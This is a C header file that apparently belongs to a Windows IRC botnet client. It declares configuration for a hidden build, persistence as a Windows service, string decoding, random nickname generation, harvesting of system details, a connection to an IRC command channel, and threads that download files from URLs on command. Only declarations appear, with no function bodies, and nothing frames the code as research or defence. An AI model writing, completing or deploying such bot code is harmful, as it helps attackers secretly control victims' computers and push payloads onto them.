

#define _WIN32_WINNT	0x0403				
#define WIN32_LEAN_AND_MEAN					
#pragma optimize("gsy", on)					
#pragma comment(linker, "/RELEASE")			
#pragma comment(linker, "/opt:nowin98")
#pragma comment(linker, "/ALIGN:4096")		
#pragma comment(linker, "/IGNORE:4108 ")	



#ifdef DEBUG
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker, "/subsystem:windows")
#endif

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>
#include <stdlib.h>
#include <Winsvc.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <shlobj.h>
#pragma comment(lib, "shfolder")

#define LOWBUF 128
#define MASBUF 4096
#define MAX_RANDOM_LETTERS		16
#define MAX_LINE				512
#define MAX_RECEIVE_BUFFER		2048
#define MAX_WORDS				64
#define THREAD_WAIT_TIME		30
#define MAX_THREADS				256
#define MAX_NICKLEN             8

typedef enum
{
	MSG_PASS,
	MSG_NICK,
	MSG_USER,
	MSG_PONG,
	MSG_JOIN,
	MSG_PART,
	MSG_PRIVMSG,
	MSG_QUIT
} ircmessage;

typedef enum
{
	NONE,
	T_DOWNLOAD,
} thread_type;

typedef struct 
{
	char	url[256];
	char	destination[MAX_PATH];
	char	channel[128];
	int		mode;
	SOCKET	ircsock;
	int		tnum;
} download_s;


typedef struct
{
	HANDLE		tHandle;
	thread_type type;
	SOCKET		tsock;
} thread_s;

extern thread_s		threads[MAX_THREADS];
extern char			cfg_servicename[];
extern char			cfg_mutex[];
extern char			cfg_filename[];


char *Decode(char *string);
unsigned int Resolve(char *host);
char *GetMyIP(SOCKET sock);
BOOL IsLanBot(SOCKET sock);
char *GenerateRandomLetters(unsigned int len);
char *GetUptime();
char *GetOSInfo(char *info);
char *GetLocale();
HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait);
void Thread_Clear(int num);
int Thread_Add(thread_type type);
void Thread_Prepare();
int Thread_Check(thread_type type);
int Thread_Kill(thread_type type);

int SC_Main(int argc, char *argv[]);
int SC_Install(char *svcpath, char *current);
void SC_StopOrUninstall(BOOL uninstall);

DWORD WINAPI IRC_Thread(LPVOID param);
int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to);
int IRC_Connect(char *host, unsigned short port);

DWORD WINAPI DL_Thread(LPVOID param);

char *GenerateNick();
void ReverseString(char string1[], char reversed[]);

